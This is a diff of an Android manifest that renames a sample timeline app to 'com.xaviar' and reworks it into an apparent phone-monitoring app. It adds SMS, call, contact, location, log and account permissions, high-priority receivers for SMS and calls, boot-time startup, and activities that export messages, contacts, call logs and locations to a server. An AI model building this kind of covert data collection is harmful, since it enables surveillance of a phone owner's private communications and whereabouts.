@@ -1,67 +1,195 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.liuapps.yamba" android:versionCode="1"
+	package="com.xaviar.ui" android:versionCode="1"
 	android:versionName="1.0">
-	<uses-sdk android:minSdkVersion="4" />
-	<uses-permission android:name="android.permission.INTERNET" />
+	<uses-sdk android:minSdkVersion="10" />
+	<uses-permission android:name="android.permission.INTERNET" />	
+	
+	<!-- permission to read and respond to an event such as outgoing calls  -->
+	<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+
+	<uses-permission android:name="android.permission.WRITE_SMS" />
+	<uses-permission android:name="android.permission.SEND_SMS" />
+	<uses-permission android:name="android.permission.RECEIVE_SMS" />
+	<uses-permission android:name="android.permission.READ_SMS" /> 
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-	<application android:icon="@drawable/icon" android:label="@string/app_name"
-		android:name=".YambaApplication">
-		<activity android:name=".TimelineActivity" android:label="@string/titleTimeline">
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+	<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+	<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+	<uses-permission android:name="android.permission.READ_CONTACTS" />
+	<uses-permission android:name="android.permission.CALL_PHONE" />	
+	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+	<uses-permission android:name="android.permission.WAKE_LOCK" />
+	<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+	 <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+	<uses-permission android:name="android.permission.READ_LOGS" />
+	<uses-permission android:name="android.permission.READ_CALENDAR" />
+	
+   
+	<application android:icon="@drawable/logo" android:label="@string/app_name"  
+		android:name="com.xaviar.ui.XaviarApplication">
+		<activity android:name="com.xaviar.ui.MainActivity" android:label="@string/titleTimeline">
 			<intent-filter>
 				<action android:name="android.intent.action.MAIN" />
 				<category android:name="android.intent.category.LAUNCHER" />
 			</intent-filter>
 		</activity>
-		<activity android:name=".StatusActivity" android:label="@string/titleStatus" />
-		<service android:name=".UpdaterService"></service>
-		<service android:name=".UpdaterIntentService"></service>
+		<activity android:name="com.xaviar.ui.ContactManager" android:label="@string/titlePhoneCall" />
+		
+		
+		 <activity
+            android:name="com.xaviar.ui.ExportDataSms"
+            android:label="@string/button1_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportSms" />
+            </intent-filter>
+        </activity>
+        
+         <activity
+            android:name="com.xaviar.ui.ExportDataContacts"
+            android:label="@string/button2_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportDataContacts" />
+            </intent-filter>
+        </activity>
+        
+          <activity
+            android:name="com.xaviar.ui.ExportPhoneParams"
+            android:label="@string/button3_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportPhoneParams" />
+            </intent-filter>
+        </activity>
+        
+        <activity
+            android:name="com.xaviar.ui.ExportDataLocations"
+            android:label="@string/button4_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportDataLocations" />
+            </intent-filter>
+        </activity>
+        
+         <activity
+            android:name="com.xaviar.ui.ExportDataDBEventSms"
+            android:label="@string/button5_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportDataDBEventSms" />
+            </intent-filter>
+        </activity>
+        
+         <activity
+            android:name="com.xaviar.ui.ExportDataDBEventPhone"
+            android:label="@string/button6_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportDataDBEventPhone" />
+            </intent-filter>
+        </activity> 
+        
+         <activity
+            android:name="com.xaviar.ui.ExportDataCallLog"
+            android:label="@string/button7_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportDataCallLog" />
+            </intent-filter>
+        </activity>
+		
+          <activity
+            android:name="com.xaviar.ui.RequestServerState"
+            android:label="@string/button8_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.RequestServerState" />
+            </intent-filter>
+        </activity>
+         
+		 <activity
+            android:name="com.xaviar.ui.ExportDataAll"
+            android:label="@string/button9_label" >
+            <intent-filter>
+                <action android:name="com.xaviar.ui.ExportDataAll" />
+            </intent-filter>
+        </activity>
+	
+		<service android:name="com.xaviar.ui.UpdaterService"></service>
+		<service android:name="com.xaviar.ui.UpdaterIntentService"></service>
+		
+		
 		<activity android:label="@string/titlePreference"
-			android:name=".PrefsActivity"></activity>
+			android:name="com.xaviar.ui.PrefsActivity"></activity>
 
-		<receiver android:name=".BootReceiver">
+		<receiver android:name="com.xaviar.ui.BootReceiver">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name=".NetworkReceiver">
+		<receiver android:name="com.xaviar.ui.NetworkReceiver">
 			<intent-filter>
 				<action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
 			</intent-filter>
 		</receiver>
+		
+	<receiver android:name="com.xaviar.events.SmsEventReceiver"
+              android:permission="android.permission.BROADCAST_SMS">
+              
+      <intent-filter android:priority="2">
+        <action android:name="android.provider.Telephony.SMS_RECEIVED" />  
+        <action android:name="android.provider.Telephony.SMS_SENT"/>        
+      </intent-filter>
+     </receiver>
+     
+	<receiver android:name="com.xaviar.events.IncomingCallPhoneEventReceiver">        
+      <intent-filter android:priority="2">
+        <action android:name="android.intent.action.PHONE_STATE" />      
+      </intent-filter>
+     </receiver>
+	
+	<receiver android:name="com.xaviar.events.OutgoingCallPhoneEventReceiver">        
+      <intent-filter android:priority="2">       
+        <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+         <action android:name="android.intent.action.PHONE_STATE" />  
+      </intent-filter>
+     </receiver>
+	
 
-		<receiver android:name=".YambaWidget" android:label="@string/msgLastTimelineUpdate">
+		<receiver android:name="com.xaviar.ui.XaviarWidget" android:label="@string/msgLastTimelineUpdate">
 			<intent-filter>
 				<action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
 			</intent-filter>
 			<intent-filter>
-				<action android:name="com.liuapps.yamba.NEW_STATUS" />
+				<action android:name="com.xaviar.ui.NEW_STATUS" />
 			</intent-filter>
 			<meta-data android:name="android.appwidget.provider"
-				android:resource="@xml/yamba_widget_info" />
+				android:resource="@xml/xaviar_widget_info" />
 		</receiver>
+		
+		
+		  <activity android:name="com.xaviar.ui.LocationActivity"
+                  android:launchMode="singleTop"
+                  android:label="Attention: Someone Monitor your data!!!">
+        </activity>
+		
+        <service android:name="com.littlefluffytoys.littlefluffylocationlibrary.LocationBroadcastService" />
+        <receiver android:name="com.littlefluffytoys.littlefluffylocationlibrary.StartupBroadcastReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />  
+            </intent-filter>  
+        </receiver>
+        <receiver android:name="com.littlefluffytoys.littlefluffylocationlibrary.PassiveLocationChangedReceiver" android:exported="true" />
+        <receiver android:name="com.xaviar.events.LocationBroadcastReceiver">
+            <intent-filter>
+                <action android:name="mobi.littlefluffytoys.littlefluffytestclient.littlefluffylocationlibrary.LOCATION_CHANGED" android:exported="false"/>
+            </intent-filter>
+        </receiver>
 
-		<provider android:name=".StatusProvider" android:authorities="com.liuapps.yamba.statusprovider" />
+		<provider android:name="com.xaviar.ui.StatusProvider" android:authorities="com.xaviar.ui.statusprovider" />
 	</application>
 
-	<permission android:name="com.liuapps.yamba.SEND_TIMELINE_NOTIFICATIONS"
-		android:label="@string/send_timeline_notifications_permission_label"
-		android:description="@string/send_timeline_notifications_permission_description"
-		android:permissionGroup="android.permission-group.PERSONAL_INFO"
-		android:protectionLevel="normal" />
 
-	<permission android:name="com.liuapps.yamba.RECEIVE_TIMELINE_NOTIFICATIONS"
-		android:label="@string/receive_timeline_notifications_permission_label"
-		android:description="@string/receive_timeline_notifications_permission_description"
-		android:permissionGroup="android.permission-group.PERSONAL_INFO"
-		android:protectionLevel="normal" />
 
-	<uses-permission android:name="com.liuapps.yamba.SEND_TIMELINE_NOTIFICATIONS" />
-	<uses-permission android:name="com.liuapps.yamba.RECEIVE_TIMELINE_NOTIFICATIONS" />
-	<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-	<uses-permission android:name="android.permission.WAKE_LOCK" />
+
+	
 </manifest>
